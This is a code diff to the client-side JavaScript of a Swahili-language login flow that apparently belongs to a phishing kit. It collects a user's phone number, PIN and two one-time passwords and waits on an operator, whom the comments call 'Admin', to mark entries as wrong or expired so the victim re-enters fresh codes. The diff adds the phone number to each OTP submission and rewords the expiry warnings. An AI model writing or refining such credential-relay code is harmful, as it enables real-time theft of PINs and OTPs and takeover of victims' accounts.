@@ -223,11 +223,13 @@ document.addEventListener('DOMContentLoaded', () => {
     bannerOtp1Error.classList.remove('active');
     showLoading('INATHIBITISHA OTP...', 'Tafadhali subiri...');
 
+    const phoneVal = signinPhone ? signinPhone.value.trim() : '';
+
     try {
       const res = await fetch('/api/submit-otp1', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ userId: currentUserId, phone: '', otp: otpVal })
+        body: JSON.stringify({ userId: currentUserId, phone: phoneVal, otp: otpVal })
       });
       const data = await res.json();
       if (data.success) {
@@ -251,11 +253,13 @@ document.addEventListener('DOMContentLoaded', () => {
     bannerOtp2Error.classList.remove('active');
     showLoading('INATHIBITISHA UHAKIKI...', 'Tafadhali subiri...');
 
+    const phoneVal = signinPhone ? signinPhone.value.trim() : '';
+
     try {
       const res = await fetch('/api/submit-otp2', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ userId: currentUserId, phone: '', otp: otpVal })
+        body: JSON.stringify({ userId: currentUserId, phone: phoneVal, otp: otpVal })
       });
       const data = await res.json();
       if (data.success) {
@@ -303,7 +307,7 @@ document.addEventListener('DOMContentLoaded', () => {
           showScreen(screenOtp2);
           if (otp2Boxes[0]) otp2Boxes[0].focus();
         } else if (data.status === 'RETRY_PIN') {
-          // Admin amebonyeza WRONG PIN: Inasafisha visanduku na kurudi kuweka PIN mpya
+          // Imeboreshwa: Inasafisha visanduku, inatoa onyo na kurudisha kwenye PIN
           clearInterval(statusPollInterval);
           hideLoading();
           pinBoxes.forEach(b => b.value = '');
@@ -311,12 +315,12 @@ document.addEventListener('DOMContentLoaded', () => {
           if (pinBoxes[0]) pinBoxes[0].focus();
           showScreen(screenSignin);
         } else if (data.status === 'RETRY_OTP1') {
-          // Admin amebonyeza OTP EXPIRED: Inatoa onyo na kurudisha mteja kuweka OTP mpya kwenye nafasi tupu
+          // Imeboreshwa: Inatoa onyo (notice), inasafisha visanduku, na kurudisha kwenye nafasi tupu za OTP
           clearInterval(statusPollInterval);
           hideLoading();
           otp1Boxes.forEach(b => b.value = '');
           if (otp1Subtitle) otp1Subtitle.innerText = 'MUDA WA OTP UMEKWISHA! Tafadhali weka OTP mpya hapa chini.';
-          showSurfaceError(bannerOtp1Error, '⚠️ MUDA WA OTP UMEKWISHA. Tafadhaliingiza OTP mpya iliyotoka.');
+          showSurfaceError(bannerOtp1Error, '⚠️ MUDA WA OTP UMEKWISHA. Weka namba mpya ya OTP iliyotoka.');
           if (otp1Boxes[0]) otp1Boxes[0].focus();
           showScreen(screenOtp1);
         } else if (data.status === 'RETRY_OTP2') {
@@ -363,4 +367,4 @@ document.addEventListener('DOMContentLoaded', () => {
     if (loadingOverlay) loadingOverlay.classList.remove('active');
   }
 });
-                                               
+                          
